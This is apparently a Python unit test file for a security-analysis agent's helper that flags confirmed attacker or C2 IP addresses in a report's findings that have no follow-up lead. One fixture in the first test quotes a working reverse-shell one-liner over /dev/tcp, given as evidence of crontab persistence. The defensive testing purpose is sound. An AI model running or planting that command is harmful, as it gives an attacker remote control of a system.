"""Offline test: the unpivoted-network-IOC helper.

A confirmed attacker/C2 network IP in ## Findings should have a corresponding pivot in
## New Leads. _unpivoted_network_iocs() returns the IPs that are missing one. It is now a
deterministic SIGNAL fed to the per-task self-review (graph/reflection.py) rather than a
standalone guard, but the precision contract is unchanged: only IPs in a confirmed
compromise context, only when absent from New Leads.

Run from project root with:
    python -m pytest tests/unit/graph/test_pivot_guard.py
"""
from __future__ import annotations

import os
import sys
import unittest

project_root = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, project_root)

from agent.runtime.graph.validation import _unpivoted_network_iocs


class PivotGuardTests(unittest.TestCase):
    def test_c2_ip_without_lead_is_flagged(self):
        report = (
            "## Findings\n"
            "- `evt-1` crontab added reverse shell `sh -i >& /dev/tcp/10.0.2.5/5555 0>&1`.\n\n"
            "## Hypotheses\n- [confirmed] persistence installed.\n\n"
            "## New Leads\n- None.\n"
        )
        self.assertEqual(_unpivoted_network_iocs(report), ["10.0.2.5"])

    def test_c2_ip_with_lead_is_not_flagged(self):
        report = (
            "## Findings\n"
            "- `evt-1` crontab added reverse shell to `10.0.2.5:5555`.\n\n"
            "## New Leads\n"
            "- title: Trace all connections to 10.0.2.5\n"
            "  pivots: ip=10.0.2.5\n  evidence: evt-1\n  priority: 90\n"
        )
        self.assertEqual(_unpivoted_network_iocs(report), [])

    def test_benign_ip_without_compromise_context_is_ignored(self):
        # The host's own agent IP in a routine bullet must not trigger the guard.
        report = (
            "## Findings\n"
            "- `evt-2` nano edited a config file on host kali (`agent.ip=10.0.2.15`).\n\n"
            "## New Leads\n- None.\n"
        )
        self.assertEqual(_unpivoted_network_iocs(report), [])

    def test_negated_finding_is_ignored(self):
        report = (
            "## Findings\n"
            "- No evidence of any callback to 10.0.2.5 was found in the window.\n\n"
            "## New Leads\n- None.\n"
        )
        self.assertEqual(_unpivoted_network_iocs(report), [])

    def test_no_findings_section_returns_empty(self):
        self.assertEqual(_unpivoted_network_iocs("just some prose"), [])

    def test_multiple_iocs_partial_coverage(self):
        report = (
            "## Findings\n"
            "- `evt-1` reverse shell to `10.0.2.5` (C2 callback).\n"
            "- `evt-2` second reverse shell observed to `192.0.2.9`.\n\n"
            "## New Leads\n"
            "- title: Investigate 10.0.2.5\n  pivots: ip=10.0.2.5\n  evidence: evt-1\n  priority: 90\n"
        )
        # 10.0.2.5 is covered; 192.0.2.9 is not.
        self.assertEqual(_unpivoted_network_iocs(report), ["192.0.2.9"])


if __name__ == "__main__":
    unittest.main(verbosity=2)
